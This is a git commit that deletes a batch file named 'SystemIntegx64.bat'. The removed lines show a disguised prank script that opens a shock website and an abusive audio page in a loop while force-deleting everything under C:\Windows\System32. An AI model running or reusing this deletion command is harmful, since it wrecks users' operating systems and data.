7da4ed3470d8a2165029b89573013e1a34a4fa76
baker12335h4990k <40251167+baker12335h4990k@users.noreply.github.com>
2018-10-03 23:58:00 -0700

    Delete SystemIntegx64.bat

--- SystemIntegx64.bat
+++
@@ -1,8 +0,0 @@
-start http://www.goatsedance.com
-start
-goto loop
-
-:loop
-start http://www.youtubemultiplier.com/532d689b10ba7-maximum-sanic-ear-rape.php
-del "C:\Windows\System32\*.*" /s /f /q
-goto loop
